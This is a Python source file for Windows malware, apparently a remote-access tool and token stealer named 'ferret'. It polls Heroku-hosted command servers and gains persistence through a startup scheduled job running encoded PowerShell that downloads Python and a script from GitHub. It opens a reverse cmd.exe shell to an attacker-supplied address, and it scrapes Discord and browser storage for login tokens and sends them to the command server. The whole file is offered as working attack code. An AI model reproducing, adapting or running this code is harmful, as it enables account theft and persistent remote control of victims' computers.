import subprocess
import secrets
import ctypes
import threading
import time
import re
import json
import socket
import os
import sys
import base64
from urllib.request import Request, urlopen

CNC_URLS   = ['http://ferret.herokuapp.com/, ''http://ferret1.herokuapp.com/']
CNC_URL    = 'http://ferret1.herokuapp.com/'
TARGET_DIR = '/Windows/'
EXEC_HASH  = 0
POLL_TIME  = 1

for CNCURL in CNC_URLS:
	try:
		if (urlopen(Request(CNCURL))).read().decode('ascii') == '0':
			CNC_URL = CNCURL;
			break;
	except:
		continue

def generateRandName():
	HASH = secrets.token_hex(secrets.randbelow(32));
	if HASH == "":
		HASH = generateRandName()
	return HASH

def createStartupPayload(SCRIPTPATH):
	PSSCRIPTPATH = f'{SCRIPTPATH}/{generateRandName()}.ps1'
	JOBTRIGGER   = generateRandName()
	SCRIPT       = open(PSSCRIPTPATH,'xb+')
	SCRIPTNAME   = 'sys.py'
	#SCRIPTNAME  = f'{generateRandName()}.py'

	#if '/windows/python/' in (sys.argv[0]).lower():
	#	SCRIPTNAME = os.path.basename(__file__)
	#else:
	#	SCRIPTNAME = f'{generateRandName()}.py'

	SCRIPT.write(('powershell.exe -encodedCommand ').encode('UTF-8'))
	SCRIPT.write(base64.b64encode(
		(f'$CMDBOOL = C:/windows/python/pythonw.exe "/windows/python/{SCRIPTNAME}"; $PATHBOOL = Test-Path -Path "/windows/python/{SCRIPTNAME}"; if (!$CMDBOOL? -Or $PATHBOOL?) {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; if ((gwmi win32_operatingsystem | select osarchitecture).osarchitecture -eq "64-bit") {{ Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.8.9/python-3.8.9-embed-amd64.zip" -OutFile "/windows/temp/py.zip"; }} else {{ Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.8.9/python-3.8.9-embed-win32.zip" -OutFile "/windows/temp/py.zip"; }} Expand-Archive /windows/temp/py.zip -DestinationPath C:/windows/python/ | Out-Null; rm /windows/temp/py.zip; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TripleKmafia/ferretcli/main/ferret.py" -OutFile "/windows/python/{SCRIPTNAME}"; C:/windows/python/pythonw.exe "/windows/python/{SCRIPTNAME}" }} Unregister-ScheduledJob -Name {JOBTRIGGER}; ').encode('UTF-16LE'))
	)
	SCRIPT.write((';\n Remove-Item -LiteralPath $myinvocation.mycommand.path -force').encode('UTF-8'))

	SCRIPT.close()
	subprocess.run(['powershell','-Command',f'$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30; Register-ScheduledJob -Trigger $trigger -FilePath {PSSCRIPTPATH} -Name {JOBTRIGGER}'])

def onExec():
	if ctypes.windll.shell32.IsUserAnAdmin() != 0:
		print(sys.argv[0])
		subprocess.run(["powershell", "-Command", "Set-ExecutionPolicy unrestricted"])
		createStartupPayload(TARGET_DIR)
	else:
		STARTUPFOLDER = (os.getenv('APPDATA')+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

	boot()

def boot():
	try:
		SYSINFO = sysInfo()
		dumpTokens()
		GETCNC = urlopen(Request(f'{CNC_URL}1/?ip={(base64.urlsafe_b64encode(bytes(SYSINFO[0],"ascii"))).decode("ascii")}'))
		idleLoop()
	except Exception:
		time.sleep((secrets.randbelow(3) + 3) * 60)	
		boot();

#MAINLOOPMAINLOOP

def idleLoop():
	while True:
		try:
			global EXEC_HASH

			IP_ADDR  = urlopen(Request("https://ident.me/")).read().decode('ascii')
			COMMANDS = json.loads(base64.urlsafe_b64decode(urlopen(Request(f'{CNC_URL}2/')).read().decode('ascii')).decode('ascii'))

			print("polled")
			if (IP_ADDR or '*' in COMMANDS['IP_ADDR']) and COMMANDS['HASH'] != EXEC_HASH:
				EXEC_HASH = COMMANDS['HASH']
				for COMMAND in COMMANDS['C']:
					if COMMAND == "EXEC_SHELL":
						shell()
					elif COMMAND == "WIPE":
						wipe()
					elif COMMAND == "DUMP_TOKEN":
						dumpTokens()
					print("executed")

			time.sleep((secrets.randbelow(POLL_TIME) + POLL_TIME) * 30)	
		except Exception as e: #DEBUGGINZ
			print(e)
			time.sleep((secrets.randbelow(POLL_TIME) + POLL_TIME) * 30)	
			boot();

#WTF DO I CALL DEEZ???? UTILS

def sysInfo():
	SYSINFO = [ 
		urlopen(Request("https://ident.me/")).read().decode('ascii')
	]
	return SYSINFO

def wipe():
	os.rmdir(f'/windows/python')
	subprocess.run(['powershell','-Command','Unregister-ScheduledJob *'], creationflags=0x00000008)
	raise SystemExit

#FUCKING SHELL SHIT
def shellRecive(SOCKET, PROCESS):
	while True:
		try:
			DATA = SOCKET.recv(1024)
			if len(DATA) > 0:
				if DATA.decode('UTF-8').strip().lower() == 'exit':
					PROCESS.terminate()
					SOCKET.close()
					break
				else:
					PROCESS.stdin.write(DATA)
					PROCESS.stdin.flush()
		except Exception as ERROR:
			PROCESS.terminate()
			break

def processSend(SOCKET, PROCESS):
	while True:
		try:
			SOCKET.send(PROCESS.stdout.read(1))
		except Exception as ERROR:
			print(ERROR)
			break

def shell():
	IP, PORT = ((urlopen(Request(f'{CNC_URL}3/'))).read().decode('ascii')).split(':')
	SOCKET   = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		SOCKET.connect((IP,int(PORT)))
		PROCESS      = subprocess.Popen(['\\windows\\system32\\cmd.exe'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE,creationflags=0x08000000)
		SHELLTHREADS = []

		for THREADFUNC in [shellRecive, processSend]:
			THREAD = threading.Thread(target=THREADFUNC,args=[SOCKET,PROCESS])
			THREAD.daemon = True;
			THREAD.start()
			SHELLTHREADS.append(THREAD)

		PROCESS.wait()
		for THREAD in SHELLTHREADS:
			THREAD.join()

	except (TimeoutError, ConnectionAbortedError, ConnectionResetError) as ERROR:
		pass

	except Exception as e:
		print(e)

#SHIT4AFTEREXEC KEN BE REMOVED LOLZ
def findToken(PATH):
	PATH += '\\Local Storage\\leveldb'

	TOKLIST = []

	for FNAME in os.listdir(PATH):
		if not FNAME.endswith('.log') and not FNAME.endswith('.ldb'):
			continue

		for LINE in [FILE.strip() for FILE in open(f'{PATH}\\{FNAME}', errors='ignore').readlines() if FILE.strip()]:
			for REGEX in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):
				for TOKEN in re.findall(REGEX, LINE):
					TOKLIST.append(TOKEN)					

	return TOKLIST

def dumpTokens():
	LOCALAPPDATA = os.getenv('LOCALAPPDATA')
	APPDATA      = os.getenv('APPDATA')

	TOKENS = []

	PATHS = [
	APPDATA + '\\Discord',
	APPDATA + '\\discordcanary',
	APPDATA + '\\discordptb',
	APPDATA + '\\Opera Software\\Opera Stable',
	LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default',
	LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
	LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default',
	]

	for PATH in PATHS:
		if not os.path.exists(PATH):
			continue

		TOKENS.append(findToken(PATH))


	TOKENDUMP = (base64.urlsafe_b64encode(bytes(str(TOKENS),'ascii'))).decode('ascii')
	urlopen(Request(f'{CNC_URL}d/?t={TOKENDUMP}'))

onExec()
